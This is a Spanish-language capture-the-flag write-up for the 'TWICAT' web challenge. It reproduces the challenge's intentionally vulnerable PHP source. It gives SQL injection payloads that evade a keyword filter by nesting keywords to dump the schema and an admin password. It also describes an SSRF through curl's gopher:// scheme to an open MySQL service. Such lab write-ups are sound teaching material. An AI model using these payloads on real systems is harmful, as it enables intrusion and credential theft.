### c0r0n4CON CTF 2020

##### Challenge: TWICAT

##### Category: Web

##### Points: 450

##### Solves: 37/362

##### Description: This is TWICAT, a cat based social network for your cat(s) to get in touch with others. It seems its administrator is so lazy to properly configure the infrastructure, will you be able to catch the hidden flag?


![web450](https://user-images.githubusercontent.com/38633962/79078283-a41f9e00-7d07-11ea-969c-eec0b837af6e.png)

Analizando la web se detectó que en la funcionalidad "Image Viewer" de la aplicación había un LFI, así que tras introducir "index.php", se pudo obtener su código fuente en base64. El cual era el siguiente:

```php
<html>

<?php
ini_set('display_errors', 'off');

class TwiCats {
    public function doQuery($sql) {
        $pdo = new SQLite3('../twicat.db', SQLITE3_OPEN_READONLY);
        $pattern ="/.*['\"].*OR.*/i";
        $user_match = preg_match($pattern, $sql);
        $chars_consec = preg_match('/(.)\\1{1}/', $sql);
        if($user_match+$chars_consec > 0)  {
            die("<h1><span style='color: red;'>SQLi detected.</span></h1>");
        }
        else {
            $securesql = implode (['order', 'union', 'by', 'from', 'group', 'select', 'insert', 'into', 'values'], '|');
            $sql = preg_replace ('/' . $securesql . '/i', '', $sql);
            $query = 'SELECT id,name FROM cats WHERE id=' . $sql . ' LIMIT 1';
            $getCats = $pdo->query($query);
            $cats = $getCats->fetchArray(SQLITE3_ASSOC);
            if ($cats) {
                return $cats;
            }
            return false;
        }
    }
}
if (isset($_POST['cat_id']) && isset($_POST['submit'])) {
    
    $cat = new TwiCats ();
    $catDetails = $cat->doQuery($_POST['cat_id']);
}

if (isset($_POST['name']) && isset($_POST['submit'])) {
	if(strpos($_POST['name'], "/") !== false){
		die("Sorry, you are not allowed to see this resource.");
	}
	$_POST['name'] = strtolower($_POST['name']);
	echo "<h1>Here you have your image -></h1><br>";
	echo base64_encode(file_get_contents($_POST['name']));
	die();
}


?>


<head>
	<title>TWICAT</title>
	<link rel="icon" type="image/jpg" href="twicat-favicon.jpg">
	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/css/fontawesome/css/font-awesome.min.css" media="all" /> 
	<link rel="stylesheet" type="text/css" href="assets/css/application.css" media="screen">
	<script src="assets/js/jquery.js"></script>
	<script src="assets/js/bootstrap.min.js"></script>
</head>
<body>
	<div class="navbar navbar-fixed-top navbar-inverse" style='margin-top:-2px;'>
	  <div class="navbar-inner">
		<div class="container">
			<div class="nav-collapse collapse">
				<ul class="nav">
					<li class='active'><a class="brand" href="">TWICAT</a></li>
				</ul>
				<ul class="nav pull-right">
					<li class='active' style='margin-top:2px;'><a href="<?php basename($_SERVER['PHP_SELF']); ?>" ><i class="icon-user"></i>&nbsp; Login &nbsp; </a></li>
				</ul>
			</div>
		</div>
	  </div>
	</div>
	<style>body {
        background-color: #f5f5f5;
      }</style>
    
	<div class="container">
	<br>
	<div id="error" ></div>
	<div class="row">
		<div class="span4"></div>
		<center><h2>Cat Details</h1><br>
		<div id="login">
			<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
			<center><h5>Cat ID</h5>
			<input type="text" class="input-block-level" placeholder="ID" name="cat_id" id="ID" required>
			<input class="btn  btn-primary" type="submit" name='submit' value = "Submit" style='margin-top:10px;'/></center>
			</form>
		</div>
		<br>
		<?php if (isset ($catDetails) && !empty ($catDetails)): ?>
			<div class="row">
				<p class="well"><strong>Username for given ID</strong>: <?php echo $catDetails['NAME']; ?> </p>
				<p class="well"><strong>Other User Details</strong>: <br />
					<?php 
					$keys = array_keys ($catDetails);
					$i = 0;

					foreach ($catDetails as $user) { 
						echo $keys[$i++] . ' -> ' . $user . "<br />";
					} 
					?> 
				</p>
			</div>
		<?php endif; ?>
		<hr><br>
		<center><h2>Image Viewer</h1><br>
		<div id="login">
			<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
			<h5>Image name</h5>
			<input type="text" class="input-block-level" placeholder="misifu.jpeg" name="name" id="name" required>
			<input class="btn  btn-primary" type="submit" name='submit' value ="Submit" style='margin-top:10px;'/></center>
			</form>
		</div>
		<div class="span4"></div>
	</div>
	</div>
</body>
</html>
```

Analizando el código fuente se vió que no era posible inyectar otros folders del sistema ya que se setectaba el caracter "/", por lo que se decidió bypassear los checks existentes para realizar una inyección SQL sobre la base de datos SQLite utilizada.

Tras varias pruebas, se consiguieron bypassear las comprobaciones existentes y obtener todas las tablas existentes con la siguiente inyección:
```
cat_id=-1+UNIUNIONON+AlL+SELSELECTECT+(SELSELECTECT+tbl_name+FRFROMOM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%'),'456'
```
Y las columnas de la tabla "CATS" con la siguiente:
```
cat_id=-1+UNIUNIONON+AlL+SELSELECTECT+(SESELECTLECT+sql+FRFROMOM+sqlite_master+WHERE+name+='CATS'+LIMIT+1),'456'
```
Con ello, procedimos a obtener la contraseña del usuario "admin" con:
```
cat_id=-1+UNIUNIONON+AlL+SELSELECTECT+(SELSELECTECT+PWD+FRFROMOM+cats+WHERE+id=1),'456'
```

![web450_1_sqli](https://user-images.githubusercontent.com/38633962/79078315-e2b55880-7d07-11ea-8b50-10489c0c8e46.png)

Puesto que no se identificó nada más relevante en la base de datos, se procedío a hacer login en "/admin.php" (identificado en "/robots.txt") con los datos obtenido ("admin/c4tH4x0r") y ver que en esta nueva parte de la web se ofrecían 3 funcionalidades más.

![web450_2_](https://user-images.githubusercontent.com/38633962/79078437-b4844880-7d08-11ea-9fed-de9138da8b0f.png)

Tras obtener el código fuente de "admin.php" igual que se hizo con "index.php" se obtenía lo siguiente:
```php
<!DOCTYPE html>
<html>

<?php
ini_set('display_errors', 'off');
require_once 'hidden/data.php';

if (isset($_POST['submit']) && isset($_POST['username']) && isset($_POST['password'])) {
	if ( $_POST['username'] === $username && $_POST['password'] === $password) {
		session_start();
		$_SESSION['auth'] = "1";
		session_write_close();
	}
}

?>

<head>
	<title>TWICAT - Administrator Panel</title>
	<link rel="icon" type="image/jpg" href="twicat-favicon.jpg">
	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css" media="screen">
	<link rel="stylesheet" type="text/css" href="assets/css/fontawesome/css/font-awesome.min.css" media="all" /> 
	<link rel="stylesheet" type="text/css" href="assets/css/application.css" media="screen">
	<script src="assets/js/jquery.js"></script>
	<script src="assets/js/bootstrap.min.js"></script>
</head>
<body>
	<div class="navbar navbar-fixed-top navbar-inverse" style='margin-top:-2px;'>
	  <div class="navbar-inner">
		<div class="container">
			<div class="nav-collapse collapse">
				<ul class="nav">
					<li class='active'><a class="brand" href="">TWICAT - Admin Panel</a></li>
				</ul>
				<ul class="nav pull-right">
					<li class='active' style='margin-top:2px;'><a href="<?php basename($_SERVER['PHP_SELF']); ?>" ><i class="icon-user"></i>&nbsp; Admin &nbsp; </a></li>
				</ul>
			</div>
		</div>
	  </div>
	</div>
	<style>body {
        background-color: #f5f5f5;
      }</style>
    
	<div class="container">
	<br>
	<div id="error" ></div>
	<div class="row">
		<div class="span4"></div>
		<?php session_start(); if (!isset($_SESSION['auth'])): ?>
			<center><h2>Administrator Login</h1><br>
			<div id="login">
				<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
				<h5>Username</h5>
				<input type="text" class="input-block-level" placeholder="Username" name="username" required>
				<h5>Password</h5>
				<input type="password" class="input-block-level" placeholder="Password" name="password" required>
				<input class="btn  btn-primary" type="submit" name='submit' value = "Submit" style='margin-top:10px;'/></center>
				</form>
			</div>
		<?php endif; session_write_close(); ?>
		<?php session_start(); if (isset($_SESSION['auth'])): ?>
			<center><h2>Administrator Panel</h1><br>
			<p>Here you have the available options to manage the server</p><br>
			<h4>Service Check</h4>
			<!--Fix user pwn.  -->
			<div id="login">
				<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
				<input class="btn  btn-primary" type="submit" name='db_check' value = "Check" style='margin-top:10px;'/>
				</form>
				<?php if (isset($_SESSION['auth']) && isset($_POST['db_check'])) { exec("netstat -antp", $out); echo "<pre>"; print_r($out); echo "</pre>"; } ?>
			</div>
			<br>
			<h4>Connectivity Check</h4>
			<div id="login">
				<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
				<input class="btn  btn-primary" type="submit" name='con_check' value = "Check" style='margin-top:10px;'/>
				</form>
				<?php if (isset($_SESSION['auth']) && isset($_POST['con_check'])) { exec("ping -c 1 8.8.8.8", $out); echo "<pre>"; print_r($out); echo "</pre>"; } ?>
			</div>
			<br>
			<h4>Post Check</h4>
			<div id="login">
				<form class="form-signin" action="<?php basename($_SERVER['PHP_SELF']); ?>" method="post" style="border:0px;">
				<input type="text" class="input-block-level" placeholder="Post URL" name="post_url" required>
				<input class="btn  btn-primary" type="submit" name='post_check' value = "Check" style='margin-top:10px;'/>
				</form>
				<?php if (isset($_SESSION['auth']) && isset($_POST['post_check'])) { exec(escapeshellcmd("curl " . escapeshellarg($_POST['post_url']) . " --output -"), $out); echo "<pre>"; print_r($out); echo "</pre>"; } ?>
			</div>
			<br>
		<?php endif; session_write_close(); ?>

		<br>
		<div class="span4"></div>
	</div>
	</div>
</body>
</html>
```

En esta nueva parte, tras mil y una pruebas (mostrando ficheros locales desde curl con "file:///", analizando servicios, etc.), se identificó que era posible conectar con el servicio de MySQL (que corría en el puerto 3306 de la máquina) a través de curl con "gopher:///" si el usuario no tenía contraseña y realizar así un ataque de SSRF. (El usuario de la BBDD, fue identificado a través del comentario "*&lt;!--Fix user pwn.  --&gt;*" existente en el código fuente de "admin.php").

Para hacer más fácil esta inyección, se utilizó la herramienta "*Gopherus*" (https://github.com/tarunkant/Gopherus), la cual nos genera el payload para la conexión con MySQL simplemente pasandole el nombre de usuario de la base de datos y la query que se quiere realizar.

Tras generar el payload para el usuario "pwn" y a la query "SELECT schema_name FROM information_schema.schemata;", fue posible obtener el flag "flag_gopher_isnt_s3cur3".

![web450_2](https://user-images.githubusercontent.com/38633962/79078319-ed6fed80-7d07-11ea-99eb-d0420f4722c3.png)
